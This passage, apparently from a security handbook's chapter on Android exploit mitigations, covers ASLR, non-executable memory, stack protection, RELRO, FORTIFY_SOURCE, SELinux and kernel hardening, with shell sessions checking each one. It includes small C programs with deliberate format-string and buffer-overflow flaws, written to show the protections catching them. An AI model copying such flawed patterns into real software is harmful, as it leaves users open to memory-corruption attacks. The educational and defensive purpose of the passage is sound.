cat-gn-takju | grep GNU_STACK\nGNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0\ndev:~/android $ readelf -a cat-gn-takju-CLEARED | grep GNU_STACK\nGNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0\nIn addition to using these programs, it is also possible to fi nd out if memory\nmappings are executable via the maps entry in the proc fi le system. The following\nexcerpts show the mappings for the cat program on a Galaxy Nexus running\nAndroid 4.2.1 and a Motorola Droid running Android 2.2.2.\nshell@android:/ $ # on the Galaxy Nexus running Android 4.2.1\nshell@android:/ $ cat /proc/self/maps | grep -E '(stack|heap)'\n409e4000-409ec000 rw-p 00000000 00:00 0 [heap]\nbebaf000-bebd0000 rw-p 00000000 00:00 0 [stack]\n$ # on the Motorola Droid running Android 2.2.2\n$ cat /proc/self/maps | grep -E '(stack|heap)'\n0001c000-00022000 rwxp 00000000 00:00 0 [heap]\nbea13000-bea14000 rwxp 00000000 00:00 0 [stack]\nc12.indd 01:23:44:PM 02/24/2014 Page 397\n398 Chapter 12 ■ Exploit Mitigations\nEach line in the maps fi le contains the start and end address, permissions,\npage offset, major, minor, inode and name of a memory region. As you can\nsee from the permissions fi elds in the earlier code, the stack and heap are not\nexecutable on the Galaxy Nexus. However, they are both executable on the\nolder Motorola Droid.\nAlthough the Linux kernel from the initial 1.5 release of Android supports\nthis mitigation, system binaries were not compiled with support for the fea-\nture. Commit 2915cc3 added support on May 5, 2010. Android 2.2 (Froyo) was\nreleased only two weeks later, but did not include the protection. The next release,\nAndroid 2.3 (Gingerbread), fi nally brought this mitigation to consumer devices.\nStill, some Gingerbread devices, such as the Sony Xperia Play running Android\n2.3.4, only partially implemented this mitigation. The following excerpt shows\nthe stack and heap memory mappings on such a device.\n$ # on a Sony Xperia Play with Android 2.3.4\n$ cat /proc/self/maps | grep -E '(stack|heap)'\n0001c000-00023000 rwxp 00000000 00:00 0 [heap]\n7e9af000-7e9b0000 rw-p 00000000 00:00 0 [stack]\nHere, the stack is not executable, but data within the heap can still be executed.\nInspecting the kernel sources for this device shows the heap was kept executable\nfor legacy compatibility reasons, though it is unclear if this was truly necessary.\nThis mitigation was enabled in the Native Development Kit (NDK) with the release\nof revision 4b in June 2010. After that release, all versions of AOSP and the NDK\nenable this compiler option by default. With this protection present, attackers\ncannot directly execute native code located within non-executable mappings.\nAddress Space Layout Randomization\nAddress Space Layout Randomization (ASLR) is a mitigation technique that aims\nto introduce entropy into the address space of a process. It was introduced by the\nPaX team in 2001 as a stop-gap measure. Most exploits from the pre-ASLR era\ndepended on hard-coded addresses. Although this was not a strict requirement,\nexploit developers of that time used such addresses to simplify development.\nThis mitigation is implemented in several places throughout the operating\nsystem kernel. However, similar to preventing data execution, the kernel enables\nand disables ASLR based on information in the binary format of executable\ncode modules. Doing this means that support is also required in the compiler\ntool chain.\nThere are many types of memory provided by the Linux kernel. This includes\nregions provided the brk and mmap system calls, stack memory, and more. The\nbrk system call provides the memory area where the process stores its heap\nc12.indd 01:23:44:PM 02/24/2014 Page 398\nChapter 12 ■ Exploit Mitigations 399\ndata. The mmap system call is responsible for mapping libraries, fi les, and other\nshared memory into a process’s virtual address space. Stack memory is allocated\nearly in process creation.\nASLR functions by introducing entropy in the virtual addresses allocated by\nthese facilities. Because there are multiple places where these regions are created,\nrandomizing each memory area requires special considerations and individual\nimplementation. For that reason, ASLR is often implemented in phases. History\nhas shown that implementers will release different versions of their operating\nsystems with varying amounts of support for ASLR. After all possible memory\nsegments are randomized, the operating system is said to support “Full ASLR.”\nEven if a system fully supports ASLR, a given process’s address space might\nnot be fully randomized. For example, an executable that does not support\nASLR cannot be randomized. This happens when the compiler fl ags required\nto enable certain features were omitted at compile time. For example, position-\nindependent executable (PIE) binaries are created by compiling with the -fPIE\nand -pie fl ags. You can determine if a particular binary was compiled with\nthese fl ags by inspecting the type fi eld using the readelf command, as shown\nin the following excerpt.\ndev:~/android $ # cat binary from Android 1.5\ndev:~/android $ readelf -h cat-g1 | grep Type:\nType: EXEC (Executable file)\ndev:~/android $ # cat binary from Android 4.2.1\ndev:~/android $ readelf -h cat-gn-takju | grep Type:\nType: DYN (Shared object file)\nWhen a binary supports having its base address randomized, it will have the\ntype DYN. When it does not, it will have the type EXEC. As you can see in the\npreceding code, the cat binary from the G1 cannot be randomized, but the one\nfrom the Galaxy Nexus can. You can verify this by sampling the base address\nin the maps fi le from proc several times, as shown here:\n# # two consecutive samples on Android 1.5\n# /system/bin/toolbox/cat /proc/self/maps | head -1\n00008000-00018000 r-xp 00000000 1f:03 520 /system/bin/toolbox\n# /system/bin/toolbox/cat /proc/self/maps | head -1\n00008000-00018000 r-xp 00000000 1f:03 520 /system/bin/toolbox\nshell@android:/ $ # two consecutive samples on Android 4.2.1\nshell@android:/ $ /system/bin/cat /proc/self/maps | grep toolbox | \\\nhead -1\n4000e000-4002b000 r-xp 00000000 103:02 267 /system/bin/toolbox\nshell@android:/ $ /system/bin/cat /proc/self/maps | grep toolbox | \\\nhead -1\n40078000-40095000 r-xp 00000000 103:02 267 /system/bin/toolbox\nc12.indd 01:23:44:PM 02/24/2014 Page 399\n400 Chapter 12 ■ Exploit Mitigations\nThe excerpts clearly show that proper binary base randomization occurs on\nAndroid 4.2.1. This can be seen from the fi rst number, the base addresses of\nthe binary’s code region. The base addresses differ between two consecutive\nexecutions, 0x4000e000 for the fi rst, and 0x40078000 for the second. As expected,\nthe base address of Android 1.5 binary does not get randomized.\nNOTE The cat binary on Android is often just a symbolic link to the toolbox\nbinary. Additionally, the shell provided by Android sometimes includes the cat com-\nmand as a built-in. On those systems, it’s necessary to execute /system/bin/cat to\nget an accurate sampling across executions.\nAnother memory area that tends to be overlooked is the vdso (x86) or vectors\n(ARM) regions. These memory mappings facilitate easier and quicker commu-\nnication with the kernel. Up until 2006, x86 Linux did not randomize the vdso\nmemory region. Even after the kernel supported randomizing the vdso, some\nLinux distributions did not enable the required kernel confi guration option\nuntil much later.\nSimilar to other modern operating systems, Android’s support for ASLR was\nimplemented in phases. Initial ASLR support, introduced in 4.0, only included\nrandomization for the stack and regions created by the mmap system call (including\ndynamic libraries). Android 4.0.3 implemented randomization for the heap in\ncommit d707fb3. However, ASLR was not implemented for the dynamic linker\nitself. Georg Wicherski and Joshua J. Drake leveraged this fact when they devel-\noped the browser exploit discussed in Chapter 8 and Chapter 9. Android 4.1.1\nmade signifi cant improvements by adding entropy into the base addresses of\nthe dynamic linker and all system binaries. As of this writing, Android almost\nfully supports ASLR. The only remaining memory region that is not random-\nized is the vectors region.\nNOTE Combining multiple mitigations, in a layered approach, is a form of defense\nin depth. Doing so signifi cantly complicates the creation of reliable exploits. The best\nexample is when ASLR and XN are both fully enabled. In isolation, they have limited\neff ect. Without full ASLR, attackers can use Return-Oriented Programming, covered\nin Chapter 9, to bypass XN. Full ASLR without XN is easily circumvented by using tech-\nniques such as heap spraying. Each of these mitigations complements the other, mak-\ning for a much stronger security posture.\nProtecting the Stack\nIn order to combat stack-based buffer overfl ows, Crispin Cowan introduced a\nprotection called StackGuard in 1997. The protection works by storing a canary\nvalue before the saved return address of the current stack frame. The canary,\nc12.indd 01:23:44:PM 02/24/2014 Page 400\nChapter 12 ■ Exploit Mitigations 401\nsometimes called a cookie, is created dynamically in a function’s prologue. The\ncode to do so is inserted by the compiler at compile time. Initially, the canary\nvalue consisted of all zeros. Later, the protection was updated to use random-\nized cookie values, which prevents exploiting buffer overfl ows occurring from\nmemcpy operations. Eventually StackGuard became unmaintained and other\nimplementations of stack protection were created.\nTo fi ll the gap left by StackGuard, Hiroaki Etoh of IBM started a project called\nProPolice. Also known as Stack-Smashing-Protector (SSP), ProPolice differs from\nStackGuard in a few ways. First, IBM implemented the protection in the front\nend of the compiler instead of the back end. Second, IBM extended protection to\ninclude more than just the return address of protected functions. Third, variables\nare reordered such that overfl owing a buffer or array is less likely to corrupt\nother local variables. Finally, ProPolice creates a copy of function arguments\nin order to protect them from corruption as well. ProPolice is standard in the\nGNU Compiler Collection (GCC) and enabled by default by many operating\nsystems, including Android.\nIn Android, the ProPolice stack protection is enabled by passing the -fstack-\nprotector fl ag to the GCC compiler. Android has supported this feature since\nthe fi rst public version, Android 1.5. In addition to being used to compile the\noperating system itself, this mitigation was enabled by default for the NDK\nused by third-party developers. This ensures that all binaries are compiled with\nthis protection by default. Android adopted this mitigation very early, which\ncertainly rendered a number of stack-based buffer overfl ow vulnerabilities\nnon-exploitable.\nFormat String Protections\nFormat string vulnerabilities represent a very interesting class of issues. When\nfi rst discovered and documented, many people were surprised that such a\nmistake could be exploited. As more people started to understand and exploit\nthe issues, mitigation research began. In 2001, several researchers presented a\npaper called “FormatGuard: Automatic Protection From printf Format String\nVulnerabilities.” Currently, several mitigation strategies, many of which are\ndescribed in the FormatGuard paper, exist for dealing with this class of issues.\nOne strategy involves special compiler fl ags that detect potentially exploit-\nable format string issues at compile time. Calling this protection a mitigation\nis a bit of a misnomer. Rather than preventing exploitation of issues that escape\ndetection, it aims to prevent introducing issues into a running system at all.\nThis protection is invoked by passing the compiler fl ags -Wformat-security and\n-Werror=format-security when compiling code. The following shell session\nexcerpt shows the behavior of the compiler with these fl ags enabled:\ndev:~/android $ cat fmt-test1.c\n#include <stdio.h>\nc12.indd 01:23:44:PM 02/24/2014 Page 401\n402 Chapter 12 ■ Exploit Mitigations\nint main(int argc, char *argv[]) {\nprintf(argv[1]);\nreturn 0;\n}\ndev:~/android $ gcc -Wformat-security -Werror=format-security -o test \\\nfmt-test1.c\nfmt-test1.c: In function 'main':\nfmt-test1.c:3:3: error: format not a string literal and no format\narguments [-Werror=format-security]\ncc1: some warnings being treated as errors\ndev:~/android $ ls -l test\nls: cannot access test: No such file or directory\nAs shown in the excerpt, the compiler prints an error instead of producing\nan executable. The compiler successfully detected that a nonconstant string was\npassed as the format string parameter to the printf function. Such a noncon-\nstant string is assumed to be controllable by an attacker, and therefore might\nrepresent a security vulnerability.\nHowever, this protection is not comprehensive. Some vulnerable programs\nwill not be detected by this protection. For example, the following program does\nnot produce any warning and therefore a binary is produced.\ndev:~/android $ cat fmt-test2.c\n#include <stdio.h>\nint main(int argc, char *argv[]) {\nprintf(argv[1], argc);\nreturn 0;\n}\ndev:~/android $ gcc -Wformat-security -Werror=format-security -o test \\\nfmt-test2.c\ndev:~/android $ ls -l test\ndev:~/android $ ./test %x\n2\nMany other such corner cases exist. An example is a custom function that\nuses the variable argument facilities, provided by the stdarg.h header. GCC\nimplements this protection using the __format__ function attribute. The fol-\nlowing excerpt from bionic/libc/include/stdio.h in the AOSP tree shows\nthis annotation for the printf function.\n237 int printf(const char *, ...)\n238 __attribute__((__format__ (printf, 1, 2)))\nThis function attribute has three arguments. The fi rst argument is the function\nname. The second and third arguments index the parameters passed to printf,\nstarting with one. The second argument indicates the index of the format string\nitself. The third argument refers to the index of the fi rst argument following the\nformat string. The printf function is just one of many functions annotated in\nc12.indd 01:23:44:PM 02/24/2014 Page 402\nChapter 12 ■ Exploit Mitigations 403\nthis way. If a custom variable argument function is not annotated this way, GCC’s\n-Wformat warning facility cannot detect the potentially vulnerable condition.\nAndroid fi rst distributed binaries built with the -Wformat-security fl ag in\nversion 2.3, known as Gingerbread. The source code change that introduced\nthis occurred on May 14, 2010. The relevant commit identifi er was d868cad.\nThis change ensures that all code built as part of Android is protected by this\nprotection. All versions of the NDK shipped with a compiler that supports this\nfeature, but the default confi guration did not use this compiler fl ag until ver-\nsion r9 in July 2013. As such, source code built using older versions of the NDK\nwill remain susceptible to format string attacks unless the developer manually\nintervenes.\nTIP Default compiler fl ags for AOSP builds are found within the build/core/\ncombo/TARGET_linux-<arch>.mk fi le, where <arch> represents the target archi-\ntecture (usually arm).\nAnother strategy involves disabling the %n format specifi er. This specifi er is\nused to precisely corrupt memory when exploiting format string vulnerabili-\nties. The Android developers removed support for the %n specifi er from Bionic\nin October 2008, prior to the fi rst public release of Android. However, while\nneutering this specifi er may make some issues non-exploitable, it does not\nholistically address the class of issues. An attacker could still potentially cause\na buffer overfl ow or denial of service condition using other format specifi ers.\nYet another strategy is enabled when defi ning _FORTIFY_SOURCE to 2 at com-\npile time. This mitigation technique prevents using the %n specifi er in a format\nstring that resides within writable memory. Contrary to the -Wformat-security\nfl ag, this protection also contains a runtime component implemented in the\noperating system C runtime library. You can read more about this strategy\nand its inclusion in Android in further detail in the “Fortifying Source Code”\nsection later in this chapter.\nRead-Only Relocations\nAnother popular technique for exploiting memory corruption vulnerabilities\ninvolves overwriting pointers used to resolve external functions. Primarily, this\ninvolves changing entries in the Global Offset Table (GOT) to point to attacker-\nsupplied machine code or other advantageous functions. This technique has\nbeen used in numerous exploits in the past since the GOT entry addresses are\neasily found using tools like readelf and objdump.\nTo prevent attackers from using this technique, long-time Linux contributor\nJakub Jelinek proposed a patch on the binutils mailing list. You can see the\nc12.indd 01:23:44:PM 02/24/2014 Page 403\n404 Chapter 12 ■ Exploit Mitigations\noriginal post at http://www.sourceware.org/ml/binutils/2004-01/msg00070.\nhtml. This patch marks the birth of a mitigation called Read-Only Relocations,\nor relro for short. First, the compiler generates a binary that opts into this protec-\ntion using the -Wl,-z,relro compiler fl ag. You can determine if a particular\nbinary is protected by this mitigation using the readelf command shown here:\ndev:~/android $ # cat binary from Android 1.5\ndev:~/android $ readelf -h cat-g1 | grep RELRO\ndev:~/android $ # cat binary from Android 4.2.1\ndev:~/android $ readelf -h cat-gn-takju | grep RELRO\nGNU_RELRO 0x01d334 0x0001e334 0x0001e334 0x00ccc 0x00ccc RW 0x4\nUnfortunately, using only the -Wl,-z,relro fl ag is insuffi cient. Using only\nthis fl ag enables what is known as partial relro. In this confi guration, the GOT\nis left writable. In order to achieve maximum effectiveness, or full relro, you\nalso need the -Wl,-z,now fl ag. The following excerpt shows how to check if\nfull relro is enabled.\ndev:~/android $ readelf -d cat-gn-takju | grep NOW\n0x0000001e (FLAGS) BIND_NOW\n0x6ffffffb (FLAGS_1) Flags: NOW\nAdding this additional fl ag instructs the dynamic linker to load all dependen-\ncies when the program starts. Because all dependencies are resolved, the linker\nno longer needs to update the GOT. Therefore, the GOT is marked as read-only\nfor the remainder of the program’s execution. With this memory area read-only, it\nis not possible to write there without fi rst changing the permissions. An attempt\nto write to the GOT crashes the process and prevents successful exploitation.\nAndroid included this mitigation in April 2012 as part of version 4.1.1. It\ncorrectly uses both the required fl ags to achieve a read-only GOT area. The\nrelevant AOSP commit identifi er was 233d460. Revision 8b was the fi rst NDK\nrelease to use this protection. After that release, all versions of AOSP and the\nNDK enable this compiler option by default. As with format string protections,\nsource code built with older versions of the NDK will remain vulnerable until\nthe developer recompiles with a newer version of the NDK. With this protection\npresent, attackers cannot write to the GOT or execute data stored there.\nSandboxing\nSandboxing has become a popular mitigation technique in the last fi ve years,\nsince the release of Google Chrome. The primary goal of sandboxing is to take\nthe principle of least privilege to the next level by running parts of a program\nwith reduced privileges and/or functionality. Some code simply has a higher\nrisk profi le, whether due to low code quality or increased exposure to untrusted\nc12.indd 01:23:44:PM 02/24/2014 Page 404\nChapter 12 ■ Exploit Mitigations 405\ndata. Running riskier code in a constrained environment can prevent success-\nful attacks. For example, a sandbox may prevent an attacker from accessing\nsensitive data or harming the system, even if the attacker can already execute\narbitrary code. Popular Windows desktop software such as Microsoft Offi ce,\nAdobe Reader, Adobe Flash, and Google Chrome use sandboxing to some extent.\nAndroid has used a form of sandboxing since its fi rst release. Recall from\nChapter 2 that Android uses individual user accounts to isolate processes from\neach other. This type of sandboxing is fairly coarse-grained, but nevertheless is\na legitimate form of sandboxing. Later, Android version 4.1 added the Isolated\nServices feature that allows an application to spawn a separate process that\nruns under a different user ID. Due to the availability of this feature, Chrome\nfor Android uses a slightly stronger sandbox on Jelly Bean–based devices than\non devices with earlier versions of Android. Future revisions of Android are\nlikely to include further enhancements in this area. You can read more about\none such initiative in the “Future of Mitigations” section later in this chapter.\nFortifying Source Code\nIn 2004, long time Linux contributor Jakub Jelinek created the source fortifi -\ncation mitigation in an effort to prevent common buffer overfl ow fl aws from\nbeing exploited. It is implemented in two parts: one in the compiler and one in\nthe operating system C library. When building source code with optimization\nenabled and -D_FORTIFY_SOURCE, the compiler wraps calls to traditionally error-\nprone functions. Wrapper functions in the C library validate various properties\nof the parameters passed to the original function at run time. For example, the\nsize of the destination buffer passed to a call to the strcpy function is checked\nagainst the length of the source string. Specifi cally, attempting to copy more\nbytes than the destination buffer can hold results in a validation failure and\nprogram termination.\nThe strcpy function is only one of many wrapped functions. Exactly which\nfunctions are fortifi ed vary from one implementation to the next. The GCC com-\npiler and C library included with Ubuntu 12.04 contains more than 70 wrapped\nfunctions. The general technique of instrumenting potentially dangerous func-\ntions is quite powerful, and can be applied to do more than just check for buffer\noverfl ows. In fact, using a value of 2 enables additional checks, including some\nthat prevent exploiting format string attacks.\nThe following excerpt shows an example of FORTIFY_SOURCE in action on an\nUbuntu 12.04 x86_64 machine:\ndev:~/android $ cat bof-test1.c\n#include <stdio.h>\n#include <string.h>\nint main(int argc, char *argv[]) {\nc12.indd 01:23:44:PM 02/24/2014 Page 405\n406 Chapter 12 ■ Exploit Mitigations\nchar buf[256];\nstrcpy(buf, argv[1]);\nreturn 0;\n}\ndev:~/android $ gcc -D_FORTIFY_SOURCE=1 -O2 -fno-stack-protector -o \\\ntest bof-test.c\ndev:~/android $ ./test `ruby -e 'puts \"A\" * 512'`\n*** buffer overflow detected ***: ./test terminated\n======= Backtrace: =========\n...\nThe test program is a simple contrived example that contains a buffer over-\nfl ow fl aw. When you attempt to copy too many bytes, the impending memory\ncorruption is detected and the program is aborted.\nDuring the development of 4.2, FORTIFY_SOURCE was implemented in the\nAndroid operating system. Unfortunately, these changes are not yet supported\nin the Android NDK. A series of several commits (0a23015, 71a18dd, cffdf66,\n9b549c3, 8df49ad, 965dbc6, f3913b5, and 260bf8c) to the Bionic C runtime library\nfortifi ed 15 of the most commonly misused functions. The following excerpt\nexamines the libc.so binary from Android 4.2.2. We used the command from\nthe Ubuntu CompilerFlags page at https://wiki.ubuntu.com/ToolChain/\nCompilerFlags to get this number.\ndev:~/android/source $ arm-eabi-readelf -a \\\nout/target/product/maguro/system/lib/libc.so \\\n| egrep ' FUNC .*_chk(@@| |$)' \\\n| sed -re 's/ \\([0-9]+\\)$//g; s/.* //g; s/@.*//g;' \\\n| egrep '^__.*_chk$' \\\n| sed -re 's/^__//g; s/_chk$//g' \\\n| sort \\\n| wc -l\n15\nPrior to Android 4.4, only level 1 of the FORTIFY_SOURCE mitigation is imple-\nmented. Although this does not include protections against format string\nattacks, it does include buffer overfl ow checks. It even includes a few Bionic-\nonly extensions that check parameters passed to the strlen function, as well\nas the BSD strlcpy and strlcat functions. Android 4.4 implemented level 2\nof the FORTIFY_SOURCE mitigation.\nTo confi rm that FORTIFY_SOURCE is in effect, we execute our test on a Galaxy\nNexus running Android 4.2.2. The build environment consists of a checkout of\nAOSP tag android-4.2.2_r1 on an Ubuntu x86_64 development machine. The\nfollowing excerpt shows the results of the test.\ndev:~/android/source $ . build/envsetup.h\n...\ndev:~/android/source $ lunch full_maguro-userdebug\n...\nc12.indd 01:23:44:PM 02/24/2014 Page 406\nChapter 12 ■ Exploit Mitigations 407\ndev:~/android/source $ tar zxf ~/ahh/bof-test.tgz\ndev:~/android/source $ make bof-test\n[... build proceeds ...]\ndev:~/android/source $ adb push \\\nout/target/product/maguro/system/bin/bof-test /data/local/tmp\n121 KB/s (5308 bytes in 0.042s)\ndev:~/android/source $ adb shell\nshell@android:/ $ myvar=`busybox seq 1 260 | busybox sed 's/.*/./' \\\n| busybox tr -d '\\n'`\nshell@android:/ $ echo -n $myvar | busybox wc -c\n260\nshell@android:/ $ /data/local/tmp/bof-test $myvar &\n[1] 29074\nshell@android:/ $\n[1] + Segmentation fault /data/local/tmp/bof-test $myvar\nshell@android:/ $ logcat -d | grep buffer\nF/libc (29074): *** strcpy buffer overflow detected ***\nWe use the AOSP build system to compile the program to verify that FORTIFY_\nSOURCE is enabled as part of the default compilation settings. As you can see,\nthe impending memory corruption is once again detected, and the program is\naborted. Rather than print the error to the console, Android logs the error using\nits standard mechanisms.\nAs powerful as source fortifi cation is, it is not without drawbacks. First of all,\nFORTIFY_SOURCE only works when operating on buffers for which the compiler\nknows the size. For example, it is unable to validate the length of a variable\nsize buffer passed as the destination pointer to strcpy. Because this mitigation\nrequires compiling with special fl ags, it cannot be retroactively applied to binary-\nonly components. Even with these shortcomings, FORTIFY_SOURCE is a powerful\nmitigation that has certainly prevented many bugs from being exploited.\nAccess Control Mechanisms\nAccess control enables administrators to limit what can be done within a com-\nputer system. There are two main types of access control: Discretionary Access\nControl (DAC) and Mandatory Access Control (MAC). Another mechanism,\ncalled Role-Based Access Control (RBAC) also exists. Although RBAC is similar\nto DAC and MAC, it is different in that it is more fl exible. It can include elements\nof both DAC and MAC. These mechanisms are used to prevent lesser-privileged\nusers from accessing valuable system resources or resources which they do not\nneed to access.\nThough MAC and DAC are similar in that they allow protecting resources,\nthey differ in one major way. Where DAC allows users to modify access poli-\ncies themselves, MAC policies are controlled by the system administrators.\nc12.indd 01:23:44:PM 02/24/2014 Page 407\n408 Chapter 12 ■ Exploit Mitigations\nThe best example of DAC is UNIX fi le system permissions. A nonprivileged\nuser can change the permissions of fi les and directories that he owns in order\nto give other users access. This does not require permission from the system\nadministrator. A relevant example of MAC is SELinux, in which the system\nadministrator must defi ne and maintain who has access to what.\nThroughout 2012 and in early 2013, Stephen Smalley, Robert Craig, Kenny\nRoot, Joshua Brindle, and William Roberts ported SELinux to Android. In April\n2013, Samsung implemented SELinux on its Galaxy S4 device. SELinux has three\nmodes of enforcement: disabled, permissive, and enforcing. Setting enforce-\nment to disabled means that SELinux is present but not doing anything. Using\nthe permissive enforcement mode, SELinux logs policy violations but does not\ndeny access. Finally, enforcing mode strictly enforces policies by denying access\nattempts that violate them. On the Galaxy S4, the default enforcement mode is\nset to permissive. Samsung’s KNOX enterprise product as well as newer Galaxy\nS4 fi rmware revisions use enforcing mode. Google announced offi cial support\nfor SELinux in Android 4.3, but it used permissive mode. Android 4.4 was the\nfi rst version to include SELinux in enforcing mode.\nSELinux is not the only access control solution that has been seen on Android\ndevices. Another MAC implementation called TOMOYO is known to be used on\nthe LG Optimus G sold in Japan. At boot, the TOMOYO policy loaded by ccs-\ninit prevents running a shell as root. Also, a kernel module called sealime.\nko was found on a Toshiba Excite Android tablet. It appears that it was at least\nloosely based on preliminary work porting SELinux to Android.\nJust like other mitigation techniques, MAC solutions do have trade-offs. First\nof all, they are usually quite diffi cult to confi gure properly. Typically, policies are\ndeveloped by putting the MAC into a learning mode and performing allowed\noperations. The alternative is a long, drawn-out process in which a policy creator\nmust manually create rules for every allowed event. Both approaches are error-\nprone because invariably some allowed operations get overlooked or incorrect\nassumptions are made. Auditing these policies is a high priority when review-\ning the security of systems that employ access control mechanisms. A properly\nconfi gured MAC can cause massive headaches for an attacker, regardless of\nwhich specifi c implementation is used.\nProtecting the Kernel\nOver the years, many researchers, including the PaX team and Brad Spengler,\nworked to harden the Linux kernel. This includes not only user-space work\nmentioned previously in this chapter but also work to prevent exploiting the\nkernel itself. However, the researchers have not been successful in getting their\nchanges included in the offi cial kernel source code. A few researchers — notably\nc12.indd 01:23:44:PM 02/24/2014 Page 408\nChapter 12 ■ Exploit Mitigations 409\nKees Cook, Dan Rosenberg, and Eric Paris — have had limited success in this\narea. That said, convincing the kernel maintainers to implement security-specifi c\nhardening measures remains a challenging proposition. As Kees and Eric have\nshown, implementing such measures in a Linux distribution-specifi c patch fi rst\nhelps. The rest of this section serves to document the hardening measures that\nare present in the Linux kernels used by Android devices.\nPointer and Log Restrictions\nThe kptr_restrict and dmesg_restrict kernel settings aim to prevent local,\nunprivileged users from obtaining sensitive kernel memory address information.\nPast kernel exploits used address information from virtual fi le system entries\nwhose output are generated from within kernel-space. By resolving this infor-\nmation on the fl y, exploit developers are able to eliminate hard-coded addresses\nand create exploits that work on multiple systems without additional effort.\nFor kptr_restrict, modifi cations were made to the printk function. Specifi cally,\nchanges enabled kernel developers to use the %pK format specifi er when print-\ning sensitive kernel pointers. Inside printk, the behavior varies based on the\nkptr_restrict setting. The values currently supported include disabled (0),\nrequire CAP_SYSLOG (1), or always replace (2). This protection comes into play\nwhen attempting to access sysfs and procfs entries such as /proc/kallsyms.\nThe following excerpt is from a Galaxy Nexus running Android 4.2.1:\nshell@android:/ $ grep slab_alloc /proc/kallsyms\n00000000 t __slab_alloc.isra.40.constprop.45\nAs you can see, the address is not shown. Instead, eight zeros are displayed.\nSimilarly, dmesg_restrict prevents unprivileged users from accessing the\nkernel ring buffer using the dmesg command or klogctl function. The follow-\ning message accompanied the original patch submitted to the Linux Kernel\nMailing List (LKML).\nRather than futilely attempt to sanitize hundreds (or thousands) of printk\nstatements and simultaneously cripple useful debugging functionality, it is\nfar simpler to create an option that prevents unprivileged users from read-\ning the syslog.\nIt was simply quicker and easier to protect access to the kernel ring buffer than\nit was to continue updating potentially sensitive pointer values. Also, several\nLinux kernel developers actively opposed changes involved in implementing\nkptr_restrict.\nThese hardening measures were developed by Dan Rosenberg. They were fi rst\nintroduced in Linux kernel version 2.6.38. Android devices using such a kernel\nhave support for this feature, though they may not enable it. Commits 2e7c833\nc12.indd 01:23:44:PM 02/24/2014 Page 409\n410 Chapter 12 ■ Exploit Mitigations\nand f9557fb landed on AOSP in November 2011. These changes set the values\nof kptr_restrict and dmesg_restrict to 2 and 1, respectively, in the default\ninit.rc fi le. Android 4.1.1 was the fi rst release to ship with these changes.\nNOTE More information about these and other settings is available in the Linux\nkernel documentation located in Documentation/sysctl/kernel.txt in the\nkernel source tree.\nProtecting the Zero Page\nOne class of issues that has plagued kernel code is null pointer dereferences.\nNormally nothing is mapped at the lowest addresses (0x00000000) on a Linux\nsystem. However, prior to Eric Paris introducing the implementation of mmap_\nmin_addr in 2007, it was possible to intentionally map this page in user-space.\nAfter mapping it, an attacker could fi ll this area of memory with contents of\ntheir choosing. Triggering null pointer–related issues in kernel-space code then\nends up using attacker-controlled content. In many cases, this led to arbitrary\nkernel-space code execution.\nThis protection works simply by preventing user-space processes from map-\nping pages of memory below a specifi ed threshold. The default value for this\nsetting (4096) prevents mapping the lowest page. Most modern operating systems\nraise this value to something higher.\nThis protection was introduced in Linux 2.6.23. The offi cial documentation\nstates that this protection was fi rst included in Android 2.3. However, test-\ning against a pool of devices reveals that it was present on devices running\nversions of Android as early as 2.1. In December 2011, commit 27cca21 increased\nthe value to 32768 in the default init.rc fi le. Android 4.1.1 was the fi rst release\nto include this commit.\nRead-Only Memory Regions\nExploiting a Linux kernel vulnerability usually hinges around modifying a\nfunction pointer, data structure, or the kernel code itself. To limit the success\nof this type of attack, some Android devices protect areas of kernel memory by\nmaking them read only. Unfortunately, only devices based on the Qualcomm\nMSM System-on-Chip (SoC), such as the Nexus 4, enforce memory protections\nthis way.\nLarry Bassel introduced the CONFIG_STRICT_MEMORY_RWX kernel confi guration\noption into the MSM kernel source in February 2011. Consider the following\nexcerpt from arch/arm/mm/mmu.c in the msm kernel tree.\n#ifdef CONFIG_STRICT_MEMORY_RWX\n...\nc12.indd 01:23:44:PM 02/24/2014 Page 410\nChapter 12 ■ Exploit Mitigations 411\nmap.pfn = __phys_to_pfn(__pa(__start_rodata));\nmap.virtual = (unsigned long)__start_rodata;\nmap.length = __init_begin - __start_rodata;\nmap.type = MT_MEMORY_R;\ncreate_mapping(&map, false);\n...\n#else\nmap.length = end - start;\nmap.type = MT_MEMORY;\n#endif\nWhen CONFIG_STRICT_MEMORY_RWX is enabled, the kernel uses the MT_MEMORY_R\nmemory type when creating the region for read-only data. Using this setting\ncauses the hardware to prevent writes to the memory region.\nThis protection comes with some drawbacks, though. First, splitting the\nkernel into several sections causes some minor memory waste. If the sections\nare less than 1 megabyte (MB), the remaining space is wasted. Second, caching\nperformance is slightly degraded. Third, preventing writes to the kernel code\ncomplicates debugging. When debugging the kernel, it’s common to insert\nbreakpoint instructions into the code. The problem is that the tools used for\ndebugging the kernel do not support operating with a read-only kernel code\nsegment.\nOther Hardening Measures\nIn addition to the exploit mitigations described earlier, various stakeholders\nin the Android ecosystem have implemented further hardening measures.\nThe offi cial Android teams and original equipment manufacturers (OEMs)\nhave made incremental improvements to the operating system, often in direct\nresponse to publicly available exploits. Although some of these changes do\nprevent exploitation, others simply put a stop to public exploits. That is, they\nonly prevent a particular action used by exploits from succeeding. Often the\naction is nonessential and can be trivially worked around by an attacker. Even\nin the less-effective cases, these changes improve the overall security posture\nof the Android operating system.\nSamsung made several changes to the customized version of Android that\nruns on their devices. As previously mentioned, Samsung also implemented\nSELinux on the Galaxy S4. For some devices, including the Galaxy S2 and S3,\nSamsung modifi ed its adbd binary to always drop privileges. Doing so causes\nexploits that (ab)use fl ags set in the build.prop and local.prop to obtain root\nprivileges to fail. To do this, Samsung simply disabled the ALLOW_ADBD_ROOT\ncompile-time fl ag, which is defi ned in system/core/adb/adb.c in the AOSP\ntree. With the release of the Galaxy S4, Samsung also modifi ed its Linux kernel\nc12.indd 01:23:44:PM 02/24/2014 Page 411\n412 Chapter 12 ■ Exploit Mitigations\nto include a compile-time kernel option called CONFIG_SEC_RESTRICT_SETUID.\nThis option is designed to prevent code from elevating from non-root to root.\nIn all but a few specifi c situations, passing the root user ID (0) to the setuid and\nsetgid family of functions causes the kernel to return an error, thereby block-\ning elevation. The Galaxy S4 also includes a kernel option called CONFIG_SEC_\nRESTRICT_FORK. For one, this restriction prevents the root user from executing\nprograms under the /data/ directory. Further, it prevents non-root processes\nfrom executing processes with root privileges.\nOther OEMs have also implemented some custom hardening measures. One\nwell-known HTC measure is the NAND lock feature, often called S-ON. This\nfeature prevents writing to certain 